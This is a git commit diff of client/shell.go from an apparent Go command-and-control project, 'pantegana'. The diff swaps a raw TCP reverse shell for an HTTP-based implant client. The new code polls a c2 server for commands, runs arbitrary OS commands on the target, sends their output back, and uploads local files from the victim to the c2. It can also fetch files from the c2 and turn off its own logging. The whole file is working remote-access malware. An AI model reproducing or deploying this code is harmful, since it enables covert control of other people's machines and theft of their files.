970bd69690ec840812ca23c3d1d4530f26e80020
elleven11 <federico.cassano@federico.codes>
2021-06-30 01:28:02 +0200

    revamped shell

--- client/shell.go
+++ client/shell.go
@@ -1,110 +1,232 @@
 package client
 
 import (
+	"bytes"
+	"crypto/tls"
+	"crypto/x509"
 	"fmt"
 	"io"
+	"io/ioutil"
 	"log"
-	"net"
+	"mime/multipart"
+	"net/http"
 	"os"
 	"os/exec"
+	"path/filepath"
+	"strings"
 	"time"
+
+	gonanoid "github.com/matoous/go-nanoid/v2"
 )
 
-const (
-	readBufSize = 128
-	bash        = "/bin/bash"
-	sh          = "/bin/sh"
-	// commandPrompt = "C:\\Windows\\System32\\cmd.exe"
-	// powerShell    = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
-)
+//go:generate go-bindata -o cert.go ../cert/server.crt
 
-// Credits to @moloch-- for the reverse shell.
-func reverseShell(command string, send chan<- []byte, recv <-chan []byte) {
-	var cmd *exec.Cmd
-	cmd = exec.Command(command)
+// routes
+const getCmdURL = "/getcmd"
+const cmdOutputURL = "/cmdoutput"
+const uploadFileURL = "/upload"
+const downloadFileURL = "/download"
 
-	stdin, _ := cmd.StdinPipe()
-	stdout, _ := cmd.StdoutPipe()
-	stderr, _ := cmd.StderrPipe()
+// debug
+const hasTLS = false
+const hasLogs = true
 
-	go func() {
-		for {
-			select {
-			case incoming := <-recv:
-				// log.Printf("[*] shell stdin write: %v", incoming)
-				stdin.Write(incoming)
-			}
-		}
-	}()
+// client-token
+var token string
 
-	go func() {
-		for {
-			buf := make([]byte, readBufSize)
-			stderr.Read(buf)
-			// log.Printf("[*] shell stderr read: %v", buf)
-			send <- buf
-		}
-	}()
-
-	cmd.Start()
-	for {
-		buf := make([]byte, readBufSize)
-		stdout.Read(buf)
-		// log.Printf("[*] shell stdout read: %v", buf)
-		send <- buf
+func ClientSetup() *http.Client {
+	// set up own cert pool
+	tlsConfig := &tls.Config{RootCAs: x509.NewCertPool()}
+	transport := &http.Transport{TLSClientConfig: tlsConfig}
+	client := &http.Client{
+		Transport: transport,
+		Timeout:   30 * time.Minute,
 	}
-}
 
-func RunShell(ip string, port string) {
-	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%s", ip, port), 5*time.Second)
+	// load trusted cert path
+	caCert, err := Asset("../cert/server.crt")
 	if err != nil {
-		log.Printf("Master is offline... retrying in 5 seconds...\n")
-		time.Sleep(10 * time.Second)
-		RunShell(ip, port)
+		panic(err)
 	}
-	log.Printf("Connected to Master\n")
+	ok := tlsConfig.RootCAs.AppendCertsFromPEM(caCert)
+	if !ok {
+		panic("Couldn't load cert file")
+	}
 
-	shellPath := getSystemShell()
+	return client
+}
 
-	send := make(chan []byte)
-	recv := make(chan []byte)
+// RequestCommand sends a HTTPS GET request to the master pantegana server
+// /getCmd endpoint and returns the parsed command string.
+func RequestCommand(client *http.Client, host string, port int) (string, string) {
+	log.Println("[+] Calling home to c2 to get cmd...")
 
-	go reverseShell(shellPath, send, recv)
+	hoststr := fmt.Sprintf("http://%s:%d", host, port)
 
-	go func() {
-		for {
-			data := make([]byte, readBufSize)
-			_, err := conn.Read(data)
-			if err == io.EOF {
-				log.Printf("Error in reading buffer. Reconnecting...")
-				RunShell(ip, port)
-			}
-			recv <- data
+	req, err := http.NewRequest("GET", hoststr+getCmdURL, nil)
+	if err != nil {
+		log.Printf("[-] Error creating the GET request: %s\n", err)
+	}
+
+	req.Header.Add("Token", token)
+
+	resp, err := client.Do(req)
+	if err != nil {
+		log.Printf("[-] Got error when requesting cmd: %s\nRetrying in 5 seconds...\n", err)
+		time.Sleep(5 * time.Second)
+		return RequestCommand(client, host, port)
+	}
+	body, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		log.Printf("[-] Error while reading body of request: %s", err)
+	}
+	log.Printf("[+] Got cmd from backend:\n%s\n", body)
+
+	defer resp.Body.Close()
+	return strings.Trim(string(body), " \n\r"), hoststr
+}
+
+// Middleware splits of the flow corresponding to the cmd
+// string and delegates to the method that is repsonsible for
+// taking out the action.
+func Middleware(client *http.Client, cmd string, host string) {
+	if strings.Compare(cmd, "quit") == 0 {
+		log.Println("[+] Quitting due to quit cmd from c2")
+		os.Exit(0)
+	} else if strings.HasPrefix(cmd, "upload") {
+		cmdTokens := strings.Split(cmd, " ")
+		if len(cmdTokens) < 3 {
+			log.Println("[-] Invalid upload command syntax.")
+		} else {
+			localFilePath := cmdTokens[1]
+			remoteFilePath := cmdTokens[2]
+			UploadFile(client, host+uploadFileURL, localFilePath, remoteFilePath)
 		}
-	}()
+	} else if strings.HasPrefix(cmd, "download") {
+		cmdTokens := strings.Split(cmd, " ")
+		if len(cmdTokens) < 3 {
+			log.Println("[-] Invalid download command syntax.")
+		} else {
+			remoteFilePath := cmdTokens[1]
+			localFilePath := cmdTokens[2]
+			DownloadFile(client, host+downloadFileURL+"?file="+remoteFilePath, localFilePath)
+		}
+	} else {
+		out := ExecAndGetOutput(string(cmd))
+		log.Printf("[+] Sending back output:\n%s\n", string(out))
+		req, err := http.NewRequest("POST", host+cmdOutputURL, bytes.NewBuffer(out))
+		if err != nil {
+			log.Printf("[-] Error creating the GET request: %s\n", err)
+			return
+		}
+
+		req.Header.Add("Token", token)
+		req.Header.Set("Content-Type", "text/html")
+
+		client.Do(req)
+	}
+	client.CloseIdleConnections()
+}
+
+// UploadFile uploads a local file on the target machine to the c2.
+func UploadFile(client *http.Client, url string, localFilePath string, remoteFilePath string) {
+	// open the file of interest
+	file, err := os.Open(localFilePath)
+	if err != nil {
+		log.Printf("[-] Error opening file: %s\n", err)
+		return
+	}
+	defer file.Close()
+
+	// create the form file
+	body := &bytes.Buffer{}
+	writer := multipart.NewWriter(body)
+	part, err := writer.CreateFormFile("uploadFile", filepath.Base(remoteFilePath))
+	if err != nil {
+		log.Printf("[-] Error creating form file: %s\n", err)
+		return
+	}
+	_, err = io.Copy(part, file)
+	err = writer.Close()
+	if err != nil {
+		log.Printf("[-] Error closing the multipart writer: %s\n", err)
+		return
+	}
+
+	// create the request
+	req, err := http.NewRequest("POST", url, body)
+	req.Header.Set("Content-Type", writer.FormDataContentType())
+	if err != nil {
+		log.Printf("[-] Error creating the request: %s\n", err)
+		return
+	}
+
+	// send it off
+	_, err = client.Do(req)
+	if err != nil {
+		log.Printf("[-] Error sending upload request: %s\n", err)
+		return
+	}
+	log.Println("[+] Uploaded file.")
+}
+
+// DownloadFile downloads a file from the c2 to the local target machine.
+func DownloadFile(client *http.Client, url string, filePath string) {
+	// get the file data
+	log.Println(url)
+	resp, err := client.Get(url)
+	if err != nil {
+		log.Printf("[-] Error getting file to download from c2: %s\n", err)
+		return
+	}
+	defer resp.Body.Close()
+
+	// create downloads dir if not existant yet
+	_ = os.Mkdir("downloads", 0755)
+	// create local file
+	out, err := os.Create("downloads/" + filePath)
+	if err != nil {
+		log.Printf("[-] Error creating local file: %s\n", err)
+		return
+	}
+	defer out.Close()
+
+	// and write data to it
+	_, err = io.Copy(out, resp.Body)
+	if err != nil {
+		log.Printf("[-] Error writing to local file: %s\n", err)
+		return
+	}
+	log.Println("[+] Successfully downloaded file")
+}
+
+// ExecAndGetOutput executes the command string on the OS
+// and returns the combined output.
+func ExecAndGetOutput(cmdString string) []byte {
+	log.Println("[+] Executing cmd...")
+	cmdTokens := strings.Split(cmdString, " ")
+	log.Println(cmdTokens)
+	cmd := exec.Command(cmdTokens[0], cmdTokens[1:]...)
+	out, err := cmd.CombinedOutput()
+	if err != nil {
+		log.Printf("[-] Failed to execute cmd with error: %s\n", err)
+		out = []byte("Failed to execute cmd")
+	}
+	return out
+}
+
+func RunShell(host string, port int) {
+	token, _ = gonanoid.New()
+
+	if !hasLogs {
+		log.SetFlags(0)
+		log.SetOutput(ioutil.Discard)
+	}
+
+	client := ClientSetup()
 
 	for {
-		select {
-		case outgoing := <-send:
-			conn.Write(outgoing)
-		}
+		cmd, hoststr := RequestCommand(client, host, port)
+		Middleware(client, cmd, hoststr)
 	}
-}
-
-func exists(path string) bool {
-	_, err := os.Stat(path)
-	if err == nil {
-		return true
-	}
-	if os.IsNotExist(err) {
-		return false
-	}
-	return true
-}
-
-func getSystemShell() string {
-	if exists(bash) {
-		return bash
-	}
-	return sh
 }
